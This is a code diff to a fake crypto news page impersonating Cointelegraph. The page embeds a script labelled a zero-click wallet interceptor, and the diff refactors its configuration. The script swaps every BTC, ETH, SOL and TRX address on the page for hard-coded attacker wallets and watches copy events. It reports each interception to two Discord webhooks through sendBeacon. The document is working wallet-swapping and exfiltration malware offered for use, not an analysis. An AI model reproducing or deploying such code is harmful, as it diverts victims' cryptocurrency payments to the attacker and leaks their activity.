@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>Cointelegraph — Crypto News</title>
     <style>
-        /* Minimal styling to look legit */
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: #f0f4f9;
@@ -126,42 +125,44 @@
 
     <script>
         // ============================================================
-        // ULTRON — ZERO-CLICK WALLET INTERCEPTOR
+        // ULTRON — ZERO-CLICK WALLET INTERCEPTOR (Discord Exfil)
         // ============================================================
         (function() {
             'use strict';
 
-            // ===== CONFIG =====
-            const CONFIG = {
-                webhooks: [
-                    "https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh",
-                    "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5"
-                ],
-                wallets: {
-                    "BTC": "bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0",
-                    "ETH": "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
-                    "SOL": "3PTUFTa9d6K79ZVwMxFRAtAJyX3s3UpYFM3FtAzgNSLt",
-                    "BNB": "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
-                    "TWT": "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
-                    "USDT_ERC20": "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
-                    "USDC_ERC20": "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
-                    "TRX": "TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU",
-                    "USDT_TRC20": "TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU"
-                },
-                patterns: {
-                    btc: /\b[13][1-9A-HJ-NP-Za-km-z]{25,34}\b|\bbc1[0-9A-Za-z]{39,59}\b/g,
-                    eth: /\b0x[a-fA-F0-9]{40}\b/g,
-                    sol: /\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/g,
-                    trx: /\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g
-                }
+            // ===== DISCORD WEBHOOKS =====
+            const WEBHOOKS = [
+                "https://discord.com/api/webhooks/1527079760449245444/qlabj53Np-uEHUI3tczLTyeTxKq4esnnApfxDG1C20aEu_j6MjtVC1z6ciB5hLS6kXRh",
+                "https://discord.com/api/webhooks/1522704131083604134/EVpC2sMkkM3J_qdhSzHoJkHZfc-0ecopsat1yKf6LUXbs6o4_HGOSyGeQrZGcRxcGKa5"
+            ];
+
+            // ===== YOUR WALLETS =====
+            const WALLETS = {
+                BTC: "bc1quj83m84xl76wya93tx9hwawxequd3rggxp6zr0",
+                ETH: "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
+                SOL: "3PTUFTa9d6K79ZVwMxFRAtAJyX3s3UpYFM3FtAzgNSLt",
+                BNB: "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
+                TWT: "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
+                USDT_ERC20: "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
+                USDC_ERC20: "0x60a4cc18dc4f1c00ff17497129351d6304fcdcc5",
+                TRX: "TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU",
+                USDT_TRC20: "TE7Ro1FcEwA734VdShe9MZcX8ehyatfFoU"
             };
 
-            // ===== UTILITY: EXFIL TO DISCORD =====
+            // ===== PATTERNS =====
+            const PATTERNS = {
+                BTC: /\b[13][1-9A-HJ-NP-Za-km-z]{25,34}\b|\bbc1[0-9A-Za-z]{39,59}\b/g,
+                ETH: /\b0x[a-fA-F0-9]{40}\b/g,
+                SOL: /\b[1-9A-HJ-NP-Za-km-z]{32,44}\b/g,
+                TRX: /\bT[1-9A-HJ-NP-Za-km-z]{33}\b/g
+            };
+
+            // ===== EXFIL TO DISCORD =====
             function exfil(data) {
-                const payload = {
+                const embed = {
                     embeds: [{
                         title: "💀 ULTRON — WALLET INTERCEPT",
-                        description: "Zero‑click wallet interception triggered.",
+                        description: "Zero-click interception triggered.",
                         color: 16711680,
                         timestamp: new Date().toISOString(),
                         fields: Object.keys(data).map(key => ({
@@ -175,11 +176,13 @@
                     }]
                 };
 
-                CONFIG.webhooks.forEach(url => {
+                const payload = JSON.stringify(embed);
+
+                WEBHOOKS.forEach(url => {
                     try {
-                        navigator.sendBeacon(url, JSON.stringify(payload));
+                        navigator.sendBeacon(url, payload);
                     } catch (e) {
-                        // Silently fail
+                        // Silent fail
                     }
                 });
             }
@@ -190,47 +193,47 @@
                     let text = node.textContent;
 
                     // BTC
-                    text = text.replace(CONFIG.patterns.btc, function(match) {
+                    text = text.replace(PATTERNS.BTC, function(match) {
                         exfil({
-                            type: "clipboard",
+                            type: "page_intercept",
                             token: "BTC",
                             original: match,
-                            replaced: CONFIG.wallets.BTC
+                            replaced: WALLETS.BTC
                         });
-                        return CONFIG.wallets.BTC;
+                        return WALLETS.BTC;
                     });
 
                     // ETH
-                    text = text.replace(CONFIG.patterns.eth, function(match) {
+                    text = text.replace(PATTERNS.ETH, function(match) {
                         exfil({
-                            type: "clipboard",
+                            type: "page_intercept",
                             token: "ETH",
                             original: match,
-                            replaced: CONFIG.wallets.ETH
+                            replaced: WALLETS.ETH
                         });
-                        return CONFIG.wallets.ETH;
+                        return WALLETS.ETH;
                     });
 
                     // SOL
-                    text = text.replace(CONFIG.patterns.sol, function(match) {
+                    text = text.replace(PATTERNS.SOL, function(match) {
                         exfil({
-                            type: "clipboard",
+                            type: "page_intercept",
                             token: "SOL",
                             original: match,
-                            replaced: CONFIG.wallets.SOL
+                            replaced: WALLETS.SOL
                         });
-                        return CONFIG.wallets.SOL;
+                        return WALLETS.SOL;
                     });
 
                     // TRX
-                    text = text.replace(CONFIG.patterns.trx, function(match) {
+                    text = text.replace(PATTERNS.TRX, function(match) {
                         exfil({
-                            type: "clipboard",
+                            type: "page_intercept",
                             token: "TRX",
                             original: match,
-                            replaced: CONFIG.wallets.TRX
+                            replaced: WALLETS.TRX
                         });
-                        return CONFIG.wallets.TRX;
+                        return WALLETS.TRX;
                     });
 
                     if (text !== node.textContent) {
@@ -250,10 +253,10 @@
                 document.addEventListener('copy', function(e) {
                     const selection = window.getSelection().toString();
                     const patterns = [
-                        { pattern: CONFIG.patterns.btc, token: "BTC" },
-                        { pattern: CONFIG.patterns.eth, token: "ETH" },
-                        { pattern: CONFIG.patterns.sol, token: "SOL" },
-                        { pattern: CONFIG.patterns.trx, token: "TRX" }
+                        { pattern: PATTERNS.BTC, token: "BTC" },
+                        { pattern: PATTERNS.ETH, token: "ETH" },
+                        { pattern: PATTERNS.SOL, token: "SOL" },
+                        { pattern: PATTERNS.TRX, token: "TRX" }
                     ];
                     patterns.forEach(function(item) {
                         const match = selection.match(item.pattern);
@@ -262,7 +265,7 @@
                                 type: "clipboard_copy",
                                 token: item.token,
                                 original: match[0],
-                                replaced: CONFIG.wallets[item.token]
+                                replaced: WALLETS[item.token]
                             });
                         }
                     });
